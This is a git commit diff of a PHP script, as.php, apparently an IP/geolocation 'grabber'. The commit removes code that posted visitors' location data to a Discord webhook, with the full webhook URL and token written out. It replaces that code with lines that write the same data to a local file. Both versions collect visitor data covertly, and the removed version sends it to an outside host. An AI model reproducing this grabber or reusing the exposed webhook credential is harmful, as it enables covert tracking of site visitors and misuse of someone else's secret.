fa2ab57c2a9fa310aaf854590b17ea2b933d6101
wed-4 <94733396+wed-4@users.noreply.github.com>
2023-02-19 18:55:13 +0900

    Update as.php

--- as.php
+++ as.php
@@ -19,26 +19,12 @@ function getgeo() {
     return var_dump($res);
 }
  
-//処理内容を定義
-function send_to_slack($message) {
-  $webhook_url = 'https://discord.com/api/webhooks/1070306598322438175/t69ISG-KPX5JosapXneCwuZJy4-ue_6kPIlcX-a4fP8Q-vilPXUbZaJdtnCZuke219h6';
-  $options = array(
-    'http' => array(
-      'method' => 'POST',
-      'header' => 'Content-Type: application/json',
-      'content' => json_encode($message),
-    )
-  );
-  $response = file_get_contents($webhook_url, false, stream_context_create($options)); //要求を$webhook_urlのURLに投げて結果を受け取る
-  return $response === 'ok'; //$responseの値がokならtrueを返す
-}
- 
-//メッセージの内容を定義
-$message = array(
-  'username' => 'grabber', 
-  'text' => getgeo(), //Slackの場合
-  //'content' => 'メッセージ内容', //Discordの場合
-);
- 
-send_to_slack($message); //処理を実行
+// ファイルを書き込みモードで開く
+$file_handle = fopen( "data.txt", "w");
+
+// ファイルへデータを書き込み
+fwrite( $file_handle, getgeo());
+
+// ファイルを閉じる
+fclose($file_handle);
 ?>
